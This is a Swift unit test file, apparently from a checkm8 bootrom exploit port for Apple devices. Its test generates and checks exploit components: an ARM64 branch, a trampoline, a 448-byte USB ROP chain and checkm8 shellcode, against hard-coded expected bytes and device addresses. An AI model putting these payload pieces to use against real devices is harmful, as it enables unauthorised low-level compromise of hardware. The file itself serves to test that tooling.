//
//  Queen_IOKitTests.swift
//  Queen-IOKitTests
//
//  Created by Cookie on 6/4/24.
//

import XCTest
@testable import Queen_IOKit
import USBDeviceSwift

// Arrange, Act, Assert
final class Queen_IOKitTests: XCTestCase {

    override func setUpWithError() throws {
        // Put setup code here. This method is called before the invocation of each test method in the class.
        try super.setUpWithError()
        
        
    }

    override func tearDownWithError() throws {
        // Put teardown code here. This method is called after the invocation of each test method in the class.
    }

    func testExploitConfig() throws {
        // This is an example of a functional test case.
        // Use XCTAssert and related functions to verify your tests produce the correct results.
        // Any test you write for XCTest can be annotated as throws and async.
        // Mark your test throws to produce an unexpected failure when your test encounters an uncaught error.
        // Mark your test async to allow awaiting for asynchronous code to complete. Check the results with assertions afterwards.
//        var dfuDevice = DfuDevice(with: usbDevice)
        let config = try ExploitConfig(withCpid: 0x8015)
        let branch = config.asmArm64Branch(source: 0x10, destination: 0x0)
        let tramp = config.asmArm64X7Trampoline(address: 0x18000C000)
        let rop = config.usbRopCallbacks(address: 0x18001C020, funcGadget: config.funcGadget, callbacks: config.callbacks)
        let shellcode = try config.prepareShellcode(for: "checkm8_arm64", constants: config.checkm8Constants)
        
        XCTAssert(branch.count == Queen_IOKitTests.expectedBranchBytes.count)
        XCTAssert(branch == Queen_IOKitTests.expectedBranchBytes)
        
        XCTAssert(tramp.count == Queen_IOKitTests.expectedTrampBytes.count)
        XCTAssert(tramp == Queen_IOKitTests.expectedTrampBytes)
        
        XCTAssert(rop.count == 448, "count: \(rop.count)\texpected: \(448)")
        // TODO: fix expectedRopBytes (5 bytes too long...)
        
        XCTAssert(shellcode.count <= Queen_IOKit.PAYLOAD_OFFSET_ARM64)
        let placeholderOffset = shellcode.count - (8 * config.checkm8Constants.count)
        XCTAssert([UInt8](shellcode.dropFirst(placeholderOffset)) == Queen_IOKitTests.expectedShellcodeBytes)
    }

    func testPerformanceExample() throws {
        // This is an example of a performance test case.
        measure {
            // Put the code you want to measure the time of here.
        }
    }

}

extension Queen_IOKitTests {
    var usbDevice: USBDevice {
        return USBDevice(
            id: 0x1,
            vendorId: 0xbeef,
            productId: 0xcafe,
            name: "test",
            deviceInterfacePtrPtr: nil,
            plugInInterfacePtrPtr: nil
        )
    }
    
    static let expectedBranchBytes: [UInt8] = [
        // branch(0x10, 0x0):
        // b'\xfc\xff\xff\x17'
        0xFC, 0xFF, 0xFF, 0x17
    ]
    
    static let expectedTrampBytes: [UInt8] = [
        // tramp(0x18000C000):
        // b'\x47\x00\x00X\xe0\x00\x1f\xd6\x00\xc0\x00\x80\x01\x00\x00\x00'
        0x47, 0x00, 0x00, 0x58, 0xE0, 0x00, 0x1F, 0xD6,
        0x00, 0xC0, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00
    ]
    
//    static let expectedRopBytes: [UInt8] = [
//        0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x30,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,
//        0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x40,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,
//        0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x50,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,
//        0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x60,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,
//        0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0xc0,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,
//        0x00,0xc8,0x01,0x80,0x01,0x00,0x00,0x00,0xd0,0x04,0x00,0x00,0x01,0x00,0x00,0x00,
//        0x40,0xc8,0x01,0x80,0x01,0x00,0x00,0x00,0xd0,0x04,0x00,0x00,0x01,0x00,0x00,0x00,
//        0x80,0xc8,0x01,0x80,0x01,0x00,0x00,0x00,0xd0,0x04,0x00,0x00,0x01,0x00,0x00,0x00,
//        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x04,0x00,0x00,0x01,0x00,0x00,0x00,
//        0x5c,0x72,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0xec,0x03,0x00,0x00,0x01,0x00,0x00,
//        0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0xd0,0xc0,0x01,0x80,0x01,0x00,0x00,
//        0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0xe0,0xc0,0x01,0x80,0x01,0x00,0x00,
//        0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0xf0,0xc0,0x01,0x80,0x01,0x00,0x00,
//        0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0xc1,0x01,0x80,0x01,0x00,0x00,
//        0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x60,0xc1,0x01,0x80,0x01,0x00,0x00,
//        0x00,0x00,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,0x5c,0x5c,0x94,0x00,0x00,0x01,0x00,
//        0x00,0x00,0x10,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,0x5c,0x5c,0x94,0x00,0x00,0x01,
//        0x00,0x00,0x00,0x00,0x00,0x02,0x80,0x01,0x00,0x00,0x00,0x5c,0x5c,0x04,0x00,0x00,
//        0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xac,0x04,0x00,0x00,
//        0x01,0x00,0x00,0x00,0xc0,0x01,0x80,0x01,0x00,0x00,0x00,0x5c,0x5c,0x94,0x00,0x00,
//        0x01,0x00,0x00,0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x70,0xc1,0x01,0x80,
//        0x01,0x00,0x00,0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x80,0xc1,0x01,0x80,
//        0x01,0x00,0x00,0x00,0xac,0xa9,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
//        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
//        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
//        0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x80,0x01,0x00,0x00,0x00,0x5c,0x5c,0x04,0x00,
//        0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xac,0x04,0x00,
//        0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc8,0x01,
//        0x80,0x01,0x00,0x00,0x00
//    ]
    
    static var expectedShellcodeBytes: [UInt8] {
        var bytes = [UInt8]()
        bytes.append(contentsOf: withUnsafeBytes(of: Int64(0x180008528).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of: Int64(0x180003A78).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of: Int64(0x10000AE80).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of: Int64(0x1800008FA).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of: Int64(0x18001BC00).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of:         Int64(384).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of:         Int64(576).littleEndian) { Array($0) } )
        bytes.append(contentsOf: withUnsafeBytes(of: Int64(0x180008638).littleEndian) { Array($0) } )
        return bytes
    }
}
